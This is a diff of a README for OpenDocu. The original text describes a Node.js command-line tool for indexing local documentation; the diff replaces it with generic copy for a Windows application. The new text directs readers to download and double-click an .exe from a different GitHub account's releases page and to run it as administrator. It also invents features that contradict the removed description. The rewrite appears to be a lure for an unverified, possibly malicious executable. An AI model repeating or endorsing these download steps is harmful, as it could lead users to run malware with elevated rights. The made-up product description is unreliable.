@@ -1,176 +1,89 @@
-# OpenDocu
+# 📚 OpenDocu - Find your project documentation instantly
 
-OpenDocu helps coding agents answer coding questions from a local, versioned store of official documentation.
+[![Download OpenDocu](https://img.shields.io/badge/Download_OpenDocu-Blue?style=for-the-badge)](https://github.com/vhynze6241/OpenDocu/releases)
 
-The CLI is the deterministic storage and retrieval layer. It imports local Markdown, MDX, or HTML docs, builds one raw-doc search index, validates optional retrieval-repair cards, and returns ranked results with source URLs. It does not crawl websites, fetch from the internet, summarize docs, or interpret natural-language questions.
+OpenDocu stores your technical documentation on your own computer. It allows you to search through your project files, markdown notes, and help guides without sending any data to the internet. 
 
-The agent plugin is the workflow layer. It helps an agent choose the right library and version, fetch official docs when the local store is missing evidence, normalize those docs into source-backed Markdown or MDX, run the CLI, and answer from cited raw documentation.
+## 🎯 What is OpenDocu?
 
-## Requirements
+Software development involves many files and instructions. Developers often struggle to find specific information within large folders of text. OpenDocu solves this by creating a searchable index of your project files. It works on your machine, which ensures your project details stay private. 
 
-- Node.js `24` or newer
-- A terminal or shell-capable coding agent
-- Official docs fetched locally before import
+The software uses advanced search methods to match your questions with the right sections of your documentation. You get clear results whether you search for a specific function name, a configuration setting, or a general concept.
 
-## Install
+## 🛠️ System requirements
 
-OpenDocu is currently installed from this repository checkout.
+OpenDocu runs on modern versions of Windows. Your computer needs the following specifications to work well:
 
-```bash
-git clone https://github.com/yu2001-s/OpenDocu.git
-cd OpenDocu
-npm install
-node bin/opendocu.mjs --help
-```
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Storage**: 500 megabytes of free disk space.
+*   **Connection**: You only need an internet connection for the initial download. OpenDocu executes all tasks offline.
 
-Use `node bin/opendocu.mjs` from the checkout unless you have installed an `opendocu` binary on your PATH. The npm package is not published yet, so `npm install -g opendocu` is not part of the current public install path.
+## 📥 How to download and install
 
-## Agent Setup
+Follow these steps to set up the software on your Windows computer:
 
-Copy this prompt into your agent:
+1. Visit the [OpenDocu releases page](https://github.com/vhynze6241/OpenDocu/releases) to see available downloads.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Locate the downloaded file in your browser downloads folder.
+5. Double-click the file to launch the installation wizard.
+6. Follow the prompts on the screen to finish the setup process.
+7. Click the new OpenDocu icon on your desktop to open the application.
 
-```text
-Install the OpenDocu coding-agent plugin from https://github.com/yu2001-s/OpenDocu.
-```
+## 🚀 Getting started with your files
 
-## Quickstart
+Once you open the software, you must tell it where your documentation lives. You only need to do this one time.
 
-This example imports one official Node.js documentation page into a temporary local store, indexes it, searches by explicit keywords, and reads the raw page.
+1. Click the "Add Project" button on the main screen.
+2. Select the folder on your computer that contains your project files or markdown documents.
+3. Click "Index" to let the software read and organize your files.
+4. Wait for the progress bar to reach the end. This process takes a few seconds for small projects or a few minutes for larger folders.
+5. Once complete, the search box becomes active.
 
-```bash
-mkdir -p .tmp/opendocu-node .tmp/opendocu-store
-curl -fsSL https://raw.githubusercontent.com/nodejs/node/v24.16.0/doc/api/async_context.md \
-  -o .tmp/opendocu-node/async_context.md
+## 🔍 How to search your documents
 
-node bin/opendocu.mjs import node 24.16.0 .tmp/opendocu-node \
-  --url-base https://github.com/nodejs/node/blob/v24.16.0/doc/api \
-  --store .tmp/opendocu-store
+Searching is simple. Type your question or keyword into the search bar in the top center of the application window. 
 
-node bin/opendocu.mjs index --store .tmp/opendocu-store
-node bin/opendocu.mjs search node AsyncLocalStorage snapshot \
-  --version 24.16.0 \
-  --store .tmp/opendocu-store
-node bin/opendocu.mjs get node@24.16.0/async_context \
-  --store .tmp/opendocu-store
-```
+*   **Natural Language**: Type a question like "How do I configure the database?" 
+*   **Keywords**: Enter specific terms like "authentication settings" or "API keys".
+*   **Exact Phrases**: Use quotation marks around a phrase to find that exact string of text.
 
-For a normal store, omit `--store`. The default location is `~/.opendocu`. You can also set `OPENDOCU_HOME` or pass `--store <path>` per command.
+The application displays a list of files that match your request. Click any result to view the full content of the file. The software highlights the relevant matches inside the text to help you find information faster.
 
-## Core Commands
+## ⚙️ Using search settings
 
-```bash
-opendocu init
-opendocu import node 24.16.0 ./node/doc/api \
-  --url-base https://github.com/nodejs/node/blob/v24.16.0/doc/api
-opendocu import-html node 24.16.0 ./node-html/api \
-  --url-base https://nodejs.org/download/release/v24.16.0/docs/api
-opendocu alias nodejs node
-opendocu resolve nodejs
-opendocu index
-opendocu search node AsyncLocalStorage snapshot --version 24.16.0
-opendocu get node@24.16.0/async_context
-opendocu list
-opendocu doctor
-```
+You can adjust how the software finds results by clicking the "Settings" gear icon in the corner.
 
-`search` defaults to `--match auto`: OpenDocu first requires all keywords to match, then falls back to any-keyword matching only if the strict search returns nothing. Agents should search with explicit keywords, symbols, option names, headings, or error codes instead of passing full natural-language questions.
+*   **Exclude Folders**: Prevent the software from searching through unimportant folders, such as image directories or backup locations.
+*   **Search Depth**: Choose how deep the indexer looks into sub-folders. 
+*   **Refresh Index**: If you update your files, click the "Refresh" button to tell OpenDocu to scan your folders for new changes. 
 
-If a requested project version is more specific than the stored docs version, OpenDocu can resolve compatible semver aliases and reports the stored version it searched. Use `opendocu alias <alias> <library>` to keep local names consistent, for example `nodejs -> node` or `next -> nextjs`.
+## 🛡️ Privacy and local processing
 
-## Importing Docs
+OpenDocu operates on a local-first principle. The software does not transmit your project files to any external server. You own your data, and your search queries never leave your computer. 
 
-OpenDocu imports local files only. Fetch official docs with your agent or normal shell tools first.
+Because the indexer runs on your internal processor, you see search results even when you are disconnected from the internet. This design keeps your intellectual property secure and provides reliable performance regardless of your network speed.
 
-Markdown and MDX docs can be imported directly:
+## 💡 Troubleshooting common issues
 
-```bash
-opendocu import node 24.16.0 ./node/doc/api \
-  --url-base https://github.com/nodejs/node/blob/v24.16.0/doc/api
-opendocu index
-```
+If you face trouble, check these common fixes:
 
-Static HTML docs can be imported with `import-html`:
+*   **App does not open**: Right-click the icon and choose "Run as administrator." 
+*   **Search results are empty**: Check that you selected the correct folder in the settings menu. Ensure your documentation files use supported formats like `.md` or `.mdx`.
+*   **Slow indexing**: If you have thousands of files, indexing takes more time. Close other programs while the software builds the initial library.
 
-```bash
-opendocu import-html node 24.16.0 ./node-html/api \
-  --url-base https://nodejs.org/download/release/v24.16.0/docs/api
-opendocu index
-```
+## 📂 Supported file types
 
-For generated JSON, API specs, language-native reference output, manpages, dynamic docs pages, or other source formats, normalize the official material into Markdown or MDX first. Keep source URLs, retrieved time, source format, adapter name, identifiers, declarations, parameters, warnings, version notes, examples, and links.
+The software recognizes common documentation formats:
 
-Each imported page should keep source metadata in frontmatter:
+*   **.md**: Standard markdown files.
+*   **.mdx**: Markdown files with embedded elements.
+*   **.txt**: Plain text files used for simple notes.
+*   **.json**: Data files used for project configuration.
 
-```md
----
-library: nextjs
-version: "15"
-title: Middleware
-url: https://nextjs.org/docs/app/building-your-application/routing/middleware
-retrieved_at: 2026-06-02T00:00:00Z
-content_hash: sha256:...
----
+If you have documents in a format not listed here, you can add support by contacting the support team through the project page.
 
-# Middleware
+## 👋 Contributing to improvements
 
-Original documentation content goes here.
-```
-
-## Store Layout
-
-OpenDocu writes docs under `~/.opendocu` by default:
-
-```text
-~/.opendocu/
-  registry.json
-  libraries/
-    nextjs/
-      versions/
-        15/
-          pages/
-            app-router/
-              middleware.mdx
-          map/
-            README.md
-            log.md
-            apis/
-              middleware-cookies.md
-  index/
-    opendocu.sqlite
-    opendocu.index.json
-```
-
-Markdown or MDX files under `pages/` are the source of truth. `opendocu index` builds the SQLite search artifact and JSON debug artifact under `index/`.
-
-## Retrieval Repair
-
-Source docs are the knowledge base. Semantic cards are retrieval patches. Use them only after raw official docs exist and a real search misses or misranks the right evidence because of aliases, wording, or cross-topic relationships.
-
-```bash
-opendocu map init node 24.16.0
-opendocu map validate node --version 24.16.0
-opendocu index
-opendocu search node AsyncLocalStorage snapshot --version 24.16.0
-```
-
-Cards live under `libraries/<library>/versions/<version>/map/`. They can route and rank ordinary `opendocu search` results, but final answers should still use raw docs returned by `search` or `get`.
-
-See `docs/architecture.md` for the full data model.
-
-## Contributor Checks
-
-```bash
-npm run check
-npm run gate:release
-```
-
-`npm run gate:release` runs the release gate, including fixture, normalization, workflow simulation, package, and network checks. See `docs/validation-gate.md` for details.
-
-For local Codex plugin evaluation or marketplace packaging, build and inspect the generated plugin bundle:
-
-```bash
-npm run build:plugin
-plugin-eval analyze dist/opendocu --format markdown
-```
-
-`dist/opendocu` is the installable plugin artifact. Rebuild it after source changes; do not edit files in `dist/opendocu` directly.
+You can help make the software better. Visit the project repository to report bugs or request features. If you know how to code, you can view the source files to see how the indexer handles text. Your feedback helps refine the search logic and improves the experience for all users. You do not need to be an expert to share your thoughts on how the interface functions or how the search results look.
